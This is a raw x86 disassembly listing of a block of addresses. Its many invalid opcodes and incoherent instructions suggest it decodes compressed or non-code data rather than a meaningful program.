  4871a1:	daa    
  4871a2:	imul   edx,DWORD PTR [eax+edx*4-0x3ba8e856],0x2a
  4871aa:	js     0x4871c2
  4871ac:	sbb    edx,DWORD PTR [edi+0x460de13f]
  4871b2:	int3   
  4871b3:	out    0x3a,eax
  4871b5:	inc    ebx
  4871b6:	xchg   ecx,eax
  4871b7:	jmp    0x48717b
  4871b9:	inc    edx
  4871ba:	out    0x9f,eax
  4871bc:	xor    al,0x42
  4871be:	or     dl,BYTE PTR [esi+0x741bf69]
  4871c4:	(bad)  
  4871c5:	stos   BYTE PTR es:[edi],al
  4871c6:	(bad)  
  4871c7:	sti    
  4871c8:	sub    edi,DWORD PTR [edx-0x41]
  4871cb:	pop    DWORD PTR [edx-0x76]
  4871ce:	inc    ebx
  4871cf:	clc    
  4871d0:	xor    ebp,DWORD PTR [edi+0x1db62062]
  4871d6:	daa    
  4871d7:	pop    ds
  4871d8:	jmp    DWORD PTR [esp+ecx*2-0x12]
  4871dc:	push   esp
  4871dd:	ja     0x487223
  4871df:	lods   al,BYTE PTR ds:[esi]
  4871e0:	sbb    ebx,DWORD PTR es:[ebx-0x1aff70b5]
  4871e7:	dec    edx
  4871e8:	sbb    al,0x33
  4871ea:	pop    ss
  4871eb:	aaa    
  4871ec:	push   ss
  4871ed:	push   esp
  4871ee:	les    edx,FWORD PTR [edi+0x262917df]
  4871f4:	popa   
  4871f5:	add    DWORD PTR [edi-0x69],edx
  4871f8:	push   esp
  4871f9:	or     bh,BYTE PTR [edx+0x70]
  4871fc:	sub    edi,0x1f
  4871ff:	mov    al,ds:0x4f22b051
  487204:	pop    es
  487205:	add    DWORD PTR [ebp-0x4a0a916],ebp
  48720b:	inc    esi
  48720c:	mov    bh,0xc4
  48720e:	arpl   WORD PTR cs:[ebp+0x3f],ax
  487212:	das    
  487213:	mov    ch,0x92
  487215:	outs   dx,BYTE PTR ds:[esi]
  487216:	test   edi,esp
  487218:	div    DWORD PTR [edi]
  48721a:	pop    ebp
  48721b:	push   edi
  48721c:	sbb    ch,ch
  48721e:	push   0xfffffff7
  487220:	lahf   
  487221:	aas    
  487222:	add    al,0xf
  487224:	out    dx,eax
  487225:	and    ecx,DWORD PTR [edi+0x638f579b]
  48722b:	inc    ebp
  48722c:	es inc esi
  48722e:	xor    DWORD PTR [bp+0x7d],esi
  487232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  487233:	out    0xdf,eax
  487235:	pop    ds
  487236:	scas   eax,DWORD PTR es:[edi]
  487237:	bound  ecx,QWORD PTR [esi*1+0x310042f9]
  48723e:	or     dl,BYTE PTR [edi-0x7bf7e4a7]
  487244:	dec    DWORD PTR [ebx]
  487246:	retf   
  487247:	ja     0x4872ba
  487249:	fistp  QWORD PTR [ecx]
  48724b:	dec    edi
  48724c:	cmp    DWORD PTR [ebp-0x73],ebp
  48724f:	mov    edx,0x7aaf715
  487254:	aaa    
  487255:	mov    WORD PTR [edi-0x405073ab],gs
  48725b:	and    DWORD PTR [ebp+0x43],ebp
  48725e:	add    eax,0x89673897
  487263:	inc    eax
  487264:	rol    BYTE PTR [ebp+0x3f],0x44
  487268:	lahf   
  487269:	xor    eax,0x2f40b969
  48726e:	inc    ebx
  48726f:	(bad)  
  487270:	sbb    bl,BYTE PTR [esi]
  487272:	sub    ch,BYTE PTR ds:0x1f45c727
  487278:	inc    ecx
  487279:	sub    al,0x39
  48727b:	cmp    DWORD PTR [eax],edi
  48727d:	xor    al,al
  48727f:	and    al,BYTE PTR [ebx+0x771b7755]
  487285:	sub    edi,DWORD PTR [edx-0x68a8e2a8]
  48728b:	pop    ss
  48728c:	xchg   esp,eax
  48728d:	inc    esi
  48728e:	pop    esp
  48728f:	adc    bh,cl
  487291:	(bad)  
  487292:	and    ebp,edx
  487294:	test   BYTE PTR [edi-0x7bcc0131],ah
  48729a:	outs   dx,BYTE PTR ds:[esi]
  48729b:	inc    ecx
  48729c:	cmp    DWORD PTR [eax],edi
  48729e:	add    BYTE PTR [edi+0x12],bl
  4872a1:	mov    eax,ds:0x5ba7558d
  4872a6:	adc    DWORD PTR ds:0x4f17bb41,0x52a75a49
  4872b0:	(bad)  
  4872b1:	out    dx,eax
  4872b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4872b3:	bound  ebp,QWORD PTR ds:0xe7468fb9
  4872b9:	lods   al,BYTE PTR ds:[esi]
  4872ba:	sbb    eax,0x41473f6c
  4872c0:	or     bh,BYTE PTR [ecx+0x743e766]
  4872c6:	jb     0x4872e9
  4872c8:	sub    ch,BYTE PTR [ecx-0x49]
  4872cb:	imul   esp,DWORD PTR [ecx],0xffffffc5
  4872ce:	and    eax,0x87c79f6c
  4872d3:	icebp  
  4872d4:	push   esi
  4872d5:	and    eax,0xd2af8f87
  4872da:	test   DWORD PTR [ecx+0x46332f42],ebx
  4872e0:	xor    al,0xad
  4872e2:	sub    al,0x14
  4872e4:	popa   
  4872e5:	addr16 out dx,eax
  4872e7:	lods   eax,DWORD PTR ds:[esi]
  4872e8:	loope  0x487303
  4872ea:	mov    ebx,0xf6dff773
  4872ef:	inc    esi
  4872f0:	ret    
  4872f1:	loopne 0x4872ae
  4872f3:	push   ds
  4872f4:	dec    edi
  4872f5:	cmova  esi,DWORD PTR [esi+0xa]
  4872f9:	or     esi,DWORD PTR [ecx-0x72b78829]
  4872ff:	rol    al,cl
  487301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487302:	xor    al,0x6f
  487304:	fcmovu st,st(6)
  487306:	or     BYTE PTR [edx],0x6f
  487309:	aaa    
  48730a:	stos   DWORD PTR es:[edi],eax
  48730b:	sub    bh,dl
  48730d:	test   BYTE PTR [ebp+0x5442ff9f],bl
  487313:	and    bl,BYTE PTR [edx+0x65]
  487316:	lahf   
  487317:	sub    eax,DWORD PTR [ebx]
  487319:	pop    edi
  48731a:	(bad)  
  48731b:	jmp    0xea7e:0xac2e3ff
  487322:	pop    edi
  487323:	ret    
  487324:	aaa    
  487325:	xlat   BYTE PTR ds:[ebx]
  487326:	sub    BYTE PTR [ebx],0xac
  487329:	mov    dh,BYTE PTR [edi]
  48732b:	mov    bh,0x67
  48732d:	shl    BYTE PTR [eax+0x237791b2],0x91
  487334:	loope  0x4872f6
  487336:	inc    ebx
  487337:	movsx  eax,WORD PTR [ecx+0x32730285]
  48733e:	(bad)  
  48733f:	mov    bh,0x4d
  487341:	xor    dl,BYTE PTR [esi-0x5f]
  487344:	cmp    DWORD PTR [ebx-0x1],edx
  487347:	add    edx,DWORD PTR [edx]
  487349:	add    esi,DWORD PTR ds:0x1c4fcf35
  48734f:	pop    edx
  487350:	or     al,0x18
  487352:	xlat   BYTE PTR ds:[ebx]
  487353:	das    
  487354:	aad    0xbe
  487356:	(bad)  
  487357:	sbb    BYTE PTR [esi],al
  487359:	out    0xef,eax
  48735b:	add    al,0x87
  48735d:	inc    ebp
  48735e:	rol    DWORD PTR [edx+0x77],0x9a
  487362:	ja     0x48732b
  487364:	add    BYTE PTR [ebp+0x707341c],0x23
  48736b:	jno    0x48734d
  48736d:	push   esi
  48736e:	push   ss
  48736f:	fistp  WORD PTR [edx-0x59]
  487372:	xchg   ecx,eax
  487373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  487374:	idiv   ebx
  487376:	out    dx,eax
  487377:	mov    dl,0xb0
  487379:	jmp    0x48738e
  48737b:	jae    0x48731c
  48737d:	mov    DWORD PTR [ecx+eax*2+0x6c],eax
  487381:	ja     0x4873d2
  487383:	lods   eax,DWORD PTR ds:[esi]
  487384:	data16 sub al,0x98
  487387:	pop    ss
  487388:	scas   eax,DWORD PTR es:[edi]
  487389:	ret    0xc06
  48738c:	outs   dx,BYTE PTR ds:[esi]
  48738d:	out    dx,eax
  48738e:	mov    edi,0x4518838b
  487393:	scas   eax,DWORD PTR es:[edi]
  487394:	outs   dx,DWORD PTR ds:[esi]
  487395:	and    DWORD PTR [ecx],esi
  487397:	sbb    eax,0xd2a7af09
  48739c:	xchg   BYTE PTR [ecx],dl
  48739e:	ror    DWORD PTR [esi],cl
  4873a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4873a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4873a2:	ror    BYTE PTR [ebp+0x68],1
  4873a5:	add    eax,0x8caabfaf
  4873aa:	sub    ebp,DWORD PTR [edi-0x2d1860a1]
  4873b0:	push   cs
  4873b1:	cmp    BYTE PTR [ebp+0x38],ah
  4873b4:	or     ebx,DWORD PTR [edi]
  4873b6:	mov    eax,ds:0x46f9d0c3
  4873bb:	xor    ebx,DWORD PTR [edi]
  4873bd:	push   esi
  4873be:	inc    esp
  4873bf:	les    edx,FWORD PTR [eax]
  4873c1:	jbe    0x48740a
  4873c3:	adc    ebp,ebx
  4873c5:	mov    eax,0x81ffb12
  4873ca:	inc    esp
  4873cb:	and    BYTE PTR [edi+edx*2],bh
  4873ce:	aaa    
  4873cf:	fisttp DWORD PTR [ebx+ebp*4+0x737c750]
  4873d6:	aas    
  4873d7:	xchg   BYTE PTR [eax-0x60cea2d6],dh
  4873dd:	mov    ds:0x8bec1752,al
  4873e2:	xchg   edi,eax
  4873e3:	aaa    
  4873e4:	psubw  mm2,QWORD PTR [eax]
  4873e7:	xor    ch,BYTE PTR [edx+0x42]
  4873ea:	pop    edi
  4873eb:	out    0x37,al
  4873ed:	push   ebp
  4873ee:	push   ecx
  4873ef:	test   eax,0x180f8b30
  4873f4:	mov    eax,ds:0x8feab899
  4873f9:	mov    cl,0x42
  4873fb:	imul   edx,DWORD PTR ds:0x84d75f87,0xbf4f0756
  487405:	inc    esi
  487406:	push   0x51
  487408:	add    edi,DWORD PTR [edi+0x77]
  48740b:	or     DWORD PTR [ecx-0x18c6c7ad],0x91ab6b32
  487415:	dec    edx
  487416:	scas   eax,DWORD PTR es:[edi]
  487417:	mov    edi,0xd41d2d67
  48741c:	jbe    0x487474
  48741e:	pop    ds
  48741f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487420:	aas    
  487421:	jno    0x487484
  487423:	and    eax,DWORD PTR [ebp+0x4d637fdb]
  487429:	or     BYTE PTR ds:0x6854535f,ch
  48742f:	ret    0xf33d
  487432:	sub    ah,BYTE PTR [edi-0x728f3a7c]
  487438:	pop    edi
  487439:	xor    DWORD PTR [edi-0x1f2de92e],ecx
  48743f:	push   es
  487440:	push   edi
  487441:	inc    ebx
  487442:	addr16 push eax
  487444:	or     bl,ch
  487446:	test   BYTE PTR [edi+0x49883e9f],al
  48744c:	jae    0x487486
  48744e:	xor    eax,DWORD PTR [edi]
  487450:	popf   
  487451:	aam    0x31
  487453:	ds scas eax,DWORD PTR es:[edi]
  487455:	jae    0x4873e6
  487457:	lea    ecx,[ecx+0x8]
  48745a:	enter  0x9f33,0x8a
  48745e:	cmp    DWORD PTR [edx-0x30bc80be],0xffffffad
  487465:	add    DWORD PTR [edx+0x2837e750],edi
  48746b:	and    al,0x86
  48746d:	dec    ebx
  48746e:	push   edi
  48746f:	xchg   edi,eax
  487470:	les    ebx,FWORD PTR [ebp+0x1f57aac0]
  487476:	inc    edx
  487477:	mov    cl,BYTE PTR [edx+0x58]
  48747a:	xchg   ebp,eax
  48747b:	aas    
  48747c:	out    dx,eax
  48747d:	jmp    0x487451
  48747f:	test   DWORD PTR [edi+esi*1+0x5a044aff],edx
  487486:	add    DWORD PTR [ecx-0x29],0x2c0e0e57
  48748d:	test   eax,0x413f42c6
  487492:	sbb    BYTE PTR [edx-0x3f],dh
  487495:	dec    edx
  487496:	(bad)  
  487497:	cmp    BYTE PTR [ecx+0x62],ah
  48749a:	push   edi
  48749b:	imul   ebp,edi,0xffffff8f
  48749e:	pop    ds
  48749f:	cmp    BYTE PTR [ecx+0x67156103],ch
  4874a5:	push   ebx
  4874a6:	add    DWORD PTR [esi],0x12573821
  4874ac:	jbe    0x487503
  4874ae:	inc    ecx
  4874af:	sub    ecx,DWORD PTR [ecx-0x7dbc2059]
  4874b5:	fstp   DWORD PTR [edx+0x7]
  4874b8:	aaa    
  4874b9:	ins    DWORD PTR es:[edi],dx
  4874ba:	cmp    al,ah
  4874bc:	pop    eax
  4874bd:	aaa    
  4874be:	inc    ecx
  4874bf:	pop    ss
  4874c0:	jmp    0xdf4a:0xfce1078
  4874c7:	aaa    
  4874c8:	push   ss
  4874c9:	lods   al,BYTE PTR ds:[esi]
  4874ca:	mov    edx,0x2907cfb1
  4874cf:	inc    eax
  4874d0:	bound  edx,QWORD PTR [eax]
  4874d2:	push   edi
  4874d3:	mov    bh,0xd2
  4874d5:	push   cs
  4874d6:	fcom   QWORD PTR [edx+0x24ef3630]
  4874dc:	sub    BYTE PTR [ebp+ecx*1+0x374787d7],cl
  4874e3:	push   cs
  4874e4:	ins    DWORD PTR es:[edi],dx
  4874e5:	lahf   
  4874e6:	rdmsr  
  4874e8:	sbb    BYTE PTR [ecx-0x3c],ch
  4874eb:	and    BYTE PTR [edx],dh
  4874ed:	fild   QWORD PTR [ebx+ecx*1-0x3c40ce9e]
  4874f4:	pop    ss
  4874f5:	push   esi
  4874f6:	xor    eax,0x7f1f3f0a
  4874fb:	dec    ebp
  4874fc:	adc    al,0x46
  4874fe:	xor    BYTE PTR [ebp+0x6f],al
  487501:	pop    ss
  487502:	push   ecx
  487503:	(bad)  
  487504:	mov    BYTE PTR [edi+edx*4+0x1605cffe],0xac
  48750c:	imul   esi,DWORD PTR [edi+0x34c41efb],0xffffff98
  487513:	test   bh,ah
  487515:	mov    edi,0x2f4d69b4
  48751a:	mov    edi,0x265817bf
  48751f:	stos   BYTE PTR es:[edi],al
  487520:	sar    DWORD PTR [edi-0x59],1
  487523:	xor    DWORD PTR ds:0xa741762c,ebp
  487529:	jb     0x487583
  48752b:	nop
  48752c:	pop    edx
  48752d:	sbb    al,BYTE PTR [edi]
  48752f:	mov    edi,0xd06b6c07
  487534:	push   0x295b7f9f
  487539:	mov    ss,WORD PTR [ebp+ecx*2+0x27]
  48753d:	xchg   DWORD PTR [eax+0x379d42d7],ebp
  487543:	daa    
  487544:	mov    bl,0x36
  487546:	je     0x487574
  487548:	mov    ss,WORD PTR ds:0x71f87cf
  48754e:	sbb    al,0x7
  487550:	mov    ebp,0x33b73ea7
  487555:	or     DWORD PTR [eax],0x54
  487558:	push   ecx
  487559:	pop    DWORD PTR [ebp+0x27e30a0b]
  48755f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487560:	cmp    BYTE PTR [ebp-0x600e2e37],cl
  487566:	outs   dx,DWORD PTR ds:[esi]
  487567:	cmp    BYTE PTR ds:0x2f235b13,ah
  48756d:	mov    DWORD PTR [ebp+0x18],0x47acd754
  487574:	inc    esi
  487575:	ja     0x4874fa
  487577:	je     0x4875b5
  487579:	push   eax
  48757a:	aaa    
  48757b:	ja     0x487547
  48757d:	push   edx
  48757e:	sub    BYTE PTR [eax+edx*1],dl
  487581:	ja     0x4875d2
  487583:	sbb    eax,0xee11496f
  487588:	xor    ah,BYTE PTR [edi]
  48758a:	pop    ds
  48758b:	dec    ebx
  48758c:	ds pusha 
  48758e:	ins    DWORD PTR es:[edi],dx
  48758f:	xchg   edi,eax
  487590:	inc    edi
  487591:	cmp    BYTE PTR [eax],cl
  487593:	sbb    ah,BYTE PTR [edx+edi*2+0x5b523723]
  48759a:	add    edx,DWORD PTR [edx-0x5b]
  48759d:	inc    edi
  48759e:	cmp    ecx,DWORD PTR [edi-0x1e]
  4875a1:	lods   al,BYTE PTR ds:[esi]
  4875a2:	sbb    cl,BYTE PTR [edx+0xf36d789]
  4875a8:	xchg   edx,eax
  4875a9:	mov    edx,0x2b7f49c5
  4875ae:	aaa    
  4875af:	sub    al,0x16
  4875b1:	add    al,0x2b
  4875b3:	iret   
  4875b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4875b5:	xchg   edx,eax
  4875b6:	sub    DWORD PTR [eax],ebp
  4875b8:	push   es
  4875b9:	adc    DWORD PTR [edi+0x1255aaa7],esp
  4875bf:	imul   eax,DWORD PTR [edi-0x7ae7b235]
  4875c6:	mov    ch,0x9f
  4875c8:	(bad)  
  4875c9:	mov    eax,ds:0xe6e0a31
  4875ce:	push   DWORD PTR [edi]
  4875d0:	mov    ds:0x776a0e8e,al
  4875d5:	and    cl,BYTE PTR ss:[eax+0x51]
  4875d9:	sub    BYTE PTR [edi+0x4330370f],dh
  4875df:	sub    DWORD PTR [ebx+0x41],0x3f
  4875e3:	(bad)  
  4875e4:	xchg   esi,eax
  4875e5:	imul   ebp,DWORD PTR [ebx],0x18
  4875e8:	addr16 jg 0x487623
  4875eb:	push   0x22
  4875ed:	jb     0x487606
  4875ef:	pop    ss
  4875f0:	inc    ebx
  4875f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4875f2:	adc    ecx,DWORD PTR [edi+0x45b7ac6c]
  4875f8:	xlat   BYTE PTR ds:[ebx]
  4875f9:	xchg   esi,eax
  4875fa:	xor    dl,BYTE PTR [edi+eiz*4+0x30]
  4875fe:	jnp    0x4875d1
  487600:	inc    edx
  487601:	push   0x5d
  487603:	aas    
  487604:	pop    es
  487605:	aas    
  487606:	push   ss
  487607:	(bad)  
  487608:	and    eax,0x67463847
  48760d:	push   esp
  48760e:	or     ah,BYTE PTR [ebx+0x367fdf20]
  487614:	popa   
  487615:	test   BYTE PTR [edx],bl
  487617:	push   edi
  487618:	(bad)  
  487619:	pusha  
  48761a:	sbb    eax,0x3fc701d4
  48761f:	test   DWORD PTR [esp+eax*4+0x22],edx
  487623:	pop    es
  487624:	pop    ss
  487625:	shl    BYTE PTR [eax],cl
  487627:	shl    BYTE PTR [eax+0x63],1
  48762a:	inc    edi
  48762b:	(bad)  
  48762c:	or     ch,dh
  48762e:	lods   eax,DWORD PTR ds:[esi]
  48762f:	int    0x2f
  487631:	imul   esi,DWORD PTR [edi],0x18
  487634:	push   ecx
  487635:	int3   
  487636:	nop
  487637:	or     eax,DWORD PTR [ebx-0x21]
  48763a:	push   esi
  48763b:	mov    DWORD PTR [ebx-0x20cc806f],ecx
  487641:	push   edx
  487642:	and    DWORD PTR [ecx+edx*4+0x345032c7],esp
  487649:	sub    ch,bl
  48764b:	jae    0x487664
  48764d:	lahf   
  48764e:	push   ss
  48764f:	or     esp,DWORD PTR [ecx]
  487651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  487652:	iret   
  487653:	ja     0x4875df
  487655:	mov    al,0x60
  487657:	mov    bh,0x57
  487659:	pop    es
  48765a:	imul   DWORD PTR [ecx+0x1b]
  48765d:	dec    ebp
  48765e:	add    al,0x4f
  487660:	(bad)  
  487661:	dec    edx
  487662:	popa   
  487663:	in     eax,dx
  487664:	add    DWORD PTR [edi],edi
  487666:	(bad)  
  487667:	iret   
  487668:	push   esi
  487669:	add    al,BYTE PTR [edi]
  48766b:	or     DWORD PTR [edi+0x3],ecx
  48766e:	or     BYTE PTR [ecx+0x28],al
  487671:	adc    al,0x47
  487673:	mov    edi,0xcd60158c
  487678:	scas   eax,DWORD PTR es:[edi]
  487679:	(bad)
  48767d:	mov    eax,0x85446f07
  487682:	sub    esp,ebx
  487684:	ss aas 
  487686:	imul   DWORD PTR [edi-0x13]
  487689:	lods   eax,DWORD PTR ds:[esi]
  48768a:	and    DWORD PTR [edi],ecx
  48768c:	jg     0x487615
  48768e:	dec    edi
  48768f:	mov    edx,0x7a068a30
  487694:	inc    edi
  487695:	jae    0x200915b5
  48769b:	pop    ds
  48769c:	xor    edx,DWORD PTR [esi-0x73]
  48769f:	pop    ebp
  4876a0:	push   edi
  4876a1:	inc    edi
  4876a3:	mov    es,WORD PTR [esi+0xfcf5845]
  4876a9:	inc    ebx
  4876aa:	mov    ch,0x2d
  4876ac:	mov    ah,0xf1
  4876ae:	mov    bl,0x53
  4876b0:	ja     0x4876f7
  4876b2:	lea    eax,[ecx+esi*4-0x39]
  4876b6:	outs   dx,DWORD PTR ds:[esi]
  4876b7:	and    al,0x4a
  4876b9:	fadd   QWORD PTR [ebp+0x457743b7]
  4876bf:	sub    DWORD PTR [ecx+0x2738872e],edi
  4876c5:	mov    BYTE PTR [eax+0x4b],al
  4876c8:	bound  eax,QWORD PTR [esi+0x37]
  4876cb:	lods   al,BYTE PTR ds:[esi]
  4876cc:	scas   eax,DWORD PTR es:[edi]
  4876cd:	adc    eax,0x714faf42
  4876d2:	outs   dx,DWORD PTR ds:[esi]
  4876d3:	aad    0xd8
  4876d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4876d6:	(bad)  
  4876d7:	fwait
  4876d8:	mov    cl,BYTE PTR ds:0x2f9ad6ab
  4876de:	scas   eax,DWORD PTR es:[edi]
  4876df:	addr16 shr dl,1
  4876e2:	push   ss
  4876e3:	mov    dh,0x17
  4876e5:	das    
  4876e6:	push   edx
  4876e7:	mov    ds:0x2f33b842,al
  4876ec:	adc    eax,0xe722d66d
  4876f1:	(bad)  
  4876f2:	aaa    
  4876f3:	mov    al,ds:0xe7a4563b
  4876f8:	mov    DWORD PTR [ebp-0x50],0x7750214a
  4876ff:	pop    es
  487700:	adc    DWORD PTR [esi-0x78],edx
  487703:	xor    eax,DWORD PTR [edx-0x4e970849]
  487709:	adc    ebx,DWORD PTR [eax]
  48770b:	lahf   
  48770c:	fidiv  WORD PTR [ebx+0x1756a80e]
  487712:	dec    edi
  487713:	inc    ecx
  487714:	sbb    DWORD PTR ds:0x108d,ecx
  487719:	dec    edi
  48771a:	iret   
  48771b:	push   ecx
  48771c:	or     ebp,esp
  48771e:	inc    ebx
  48771f:	push   ss
  487720:	xor    dl,BYTE PTR [edi-0x38a52ae8]
  487726:	xor    al,0xcf
  487728:	mov    edi,0xd6d2d89
  48772d:	addr16 dec edi
  48772f:	lahf   
  487730:	mov    edi,DWORD PTR [ebp+0x38f71d24]
  487736:	pop    ebx
  487737:	pop    ds
  487738:	add    DWORD PTR [ecx-0x5004fef2],esi
  48773e:	in     al,0x91
  487740:	pop    bp
  487742:	inc    ecx
  487743:	daa    
  487744:	ja     0x4876f2
  487746:	pop    edx
  487747:	hlt    
  487748:	lock push ebx
  48774a:	pop    es
  48774b:	xchg   edi,eax
  48774c:	xlat   BYTE PTR ds:[ebx]
  48774d:	dec    eax
  48774e:	inc    edi
  48774f:	fmul   DWORD PTR ds:0x7759776f
  487755:	sbb    al,0x1c
  487757:	aaa    
  487758:	inc    edi
  487759:	out    0x32,eax
  48775b:	cdq    
  48775c:	mov    ds:0x34cf8686,al
  487761:	fbstp  TBYTE PTR [esi]
  487763:	nop
  487764:	pop    edx
  487765:	sbb    eax,0xa9051f01
  48776a:	fidiv  DWORD PTR [edi+ecx*8-0x5140e0cd]
  487771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  487772:	mov    al,0x6b
  487774:	retf   
  487775:	lahf   
  487776:	inc    esi
  487777:	outs   dx,BYTE PTR ds:[esi]
  487778:	ins    DWORD PTR es:[edi],dx
  487779:	loopne 0x487701
  48777b:	iret   
  48777c:	cmp    DWORD PTR [edi],esp
  48777e:	mov    dl,0x29
  487780:	pop    es
  487781:	cs stc 
  487783:	daa    
  487784:	xor    dl,BYTE PTR ss:[edi+0x56]
  487788:	jne    0x48773e
  48778a:	cs pop ds
  48778c:	inc    ebx
  48778d:	aaa    
  48778e:	mov    al,0x86
  487790:	inc    ebp
  487791:	adc    al,BYTE PTR [ebx]
  487793:	inc    edi
  487794:	mov    es,esp
  487796:	pop    edx
  487797:	adc    edi,DWORD PTR [edi]
  487799:	daa    
  48779a:	iret   
  48779b:	lds    edx,FWORD PTR [ecx+0x30]
  48779e:	les    ebp,FWORD PTR [edx+0x789731cf]
  4877a4:	lods   eax,DWORD PTR ds:[esi]
  4877a5:	loope  0x4877bd
  4877a7:	add    bl,BYTE PTR [edi+0x6e]
  4877aa:	and    eax,0xbb7899e4
  4877af:	data16 xor al,0x1a
  4877b2:	scas   al,BYTE PTR es:[edi]
  4877b3:	push   ebp
  4877b4:	sub    bh,ch
  4877b6:	mov    DWORD PTR [edx-0x20],0xd70cc852
  4877bd:	xor    ch,BYTE PTR [ebx+0x563e9c35]
  4877c3:	das    
  4877c4:	pop    edi
  4877c5:	aaa    
  4877c6:	xchg   edi,eax
  4877c7:	sub    eax,0x425c8bc2
  4877cc:	neg    DWORD PTR [edi-0x18]
  4877cf:	lods   eax,DWORD PTR ds:[esi]
  4877d0:	dec    esi
  4877d1:	lods   eax,DWORD PTR ds:[esi]
  4877d2:	pop    ss
  4877d3:	pop    ss
  4877d4:	stos   DWORD PTR es:[edi],eax
  4877d5:	push   ss
  4877d6:	pop    esp
  4877d7:	(bad)  
  4877d8:	push   cs
  4877d9:	aaa    
  4877da:	dec    edi
  4877db:	xor    DWORD PTR [edi+0x33068894],edi
  4877e1:	call   DWORD PTR [edi-0xfc1e52c]
  4877e7:	daa    
  4877e8:	ja     0x487849
  4877ea:	jne    0x487798
  4877ec:	or     edi,DWORD PTR [edx+0x3f]
  4877ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4877f0:	pop    ds
  4877f1:	sub    dh,al
  4877f3:	inc    esi
  4877f4:	bound  edi,QWORD PTR [edi-0x2be8cf81]
  4877fa:	push   edx
  4877fb:	mov    edi,0x6123c239
  487800:	aad    0x8f
  487802:	jg     0x487849
  487804:	mov    ds:0x870d6bb8,eax
  487809:	pop    ebx
  48780a:	inc    edx
  48780b:	xchg   edi,eax
  48780c:	inc    ecx
  48780d:	xor    BYTE PTR [eax],cl
  48780f:	add    eax,0xb807b2bf
  487814:	dec    edx
  487815:	sub    ecx,DWORD PTR [edi+eiz*2+0x4b530bf]
  48781c:	or     ebx,DWORD PTR [ebp-0x61]
  48781f:	xchg   edi,esp
  487821:	adc    eax,0xaf2956a8
  487826:	mov    bh,0x52
  487828:	test   al,0x24
  48782a:	push   esi
  48782b:	xlat   BYTE PTR ds:[ebx]
  48782c:	mov    ecx,0x7c56202
  487832:	out    0xe7,eax
  487834:	pushf  
  487835:	mov    ecx,0x336f212e
  48783a:	out    dx,al
  48783b:	fadd   QWORD PTR [ecx+0x3fb708d0]
  487841:	xor    esi,eax
  487843:	xor    eax,0x46f740e9
  487848:	outs   dx,BYTE PTR ds:[si]
  48784a:	push   0x33173372
  48784f:	xlat   BYTE PTR ds:[ebx]
  487850:	imul   edx,DWORD PTR [eax+0xa],0x29
  487854:	pop    es
  487855:	dec    edx
  487856:	dec    eax
  487857:	push   ebp
  487858:	aaa    
  487859:	push   edi
  48785a:	inc    esp
  48785b:	iret   
  48785c:	add    eax,0xfea496b1
  487861:	xor    DWORD PTR [edi-0x79],ebx
  487864:	or     ch,BYTE PTR [ebx+0x12]
  487867:	inc    edx
  487868:	outs   dx,DWORD PTR ds:[esi]
  487869:	push   ebp
  48786a:	inc    ecx
  48786b:	cmp    BYTE PTR [edi+edi*2-0x21f418a1],ch
  487872:	sbb    cl,BYTE PTR [ecx+0x69fdf7f]
  487878:	adc    esi,DWORD PTR [edx+eax*4-0x53e8a8c7]
  48787f:	xor    eax,0x42b7111d
  487884:	(bad)  
  487885:	mov    ah,0x2a
  487887:	and    al,0xd6
  487889:	(bad)  
  48788b:	mov    al,0xad
  48788d:	add    al,BYTE PTR [ebx+0x3f]
  487890:	inc    esi
  487891:	push   edi
  487892:	lahf   
  487893:	test   esp,edx
  487895:	or     BYTE PTR [esi+ebp*8],cl
  487898:	fisttp WORD PTR [eax+0xf151753]
  48789e:	inc    ecx
  48789f:	(bad)  
  4878a0:	hlt    
  4878a1:	mov    al,0xaa
  4878a3:	ins    DWORD PTR es:[edi],dx
  4878a4:	inc    esi
  4878a5:	rcl    DWORD PTR [edi],cl
  4878a7:	pop    ds
  4878a8:	push   edx
  4878a9:	fisttp DWORD PTR [eax]
  4878ab:	push   esi
  4878ac:	fbstp  TBYTE PTR [ebx]
  4878ae:	xchg   DWORD PTR [ebp+0x5d],ecx
  4878b1:	sbb    ah,BYTE PTR [ecx-0x296a44f1]
  4878b7:	mov    dh,BYTE PTR [edi+eax*4-0x31]
  4878bb:	(bad)
  4878bf:	sbb    cl,bh
  4878c1:	(bad)  
  4878c2:	jne    0x4878a6
  4878c4:	bound  ebp,QWORD PTR [ebx]
  4878c6:	xchg   DWORD PTR [edi+0x39],esp
  4878c9:	out    0x60,eax
  4878cb:	cmp    dh,cl
  4878cd:	mov    eax,ds:0x8e37dff7
  4878d2:	adc    esp,0x5e9f1f40
  4878d8:	add    ebp,DWORD PTR [ebx-0x50]
  4878db:	packuswb mm0,QWORD PTR [ebp-0x6e]
  4878df:	mov    eax,ds:0x34275892
  4878e4:	add    al,0xa
  4878e6:	add    al,0x5c
  4878e8:	sahf   
  4878e9:	xlat   BYTE PTR ds:[ebx]
  4878ea:	(bad)  
  4878eb:	xlat   BYTE PTR ds:[ebx]
  4878ec:	mov    ebx,0x9b32eb43
  4878f1:	repz adc eax,0xb705615d
  4878f7:	jae    0x487950
  4878f9:	sahf   
  4878fa:	xor    al,0x62
  4878fc:	stos   DWORD PTR es:[edi],eax
  4878fd:	sahf   
  4878fe:	xlat   BYTE PTR ds:[ebx]
  4878ff:	pop    edi
  487900:	pop    edx
  487901:	adc    al,0xc6
  487903:	mov    ch,0x6f
  487905:	pop    ss
  487906:	mov    DWORD PTR [ebx],esp
  487908:	lods   al,BYTE PTR ds:[esi]
  487909:	add    al,BYTE PTR [edi+0x355b808b]
  48790f:	lock (bad) 
  487911:	xlat   BYTE PTR ds:[ebx]
  487912:	adc    cl,BYTE PTR [edx]
  487914:	ffree  st(0)
  487916:	cmp    ch,BYTE PTR [edi]
  487918:	mov    bh,0x69
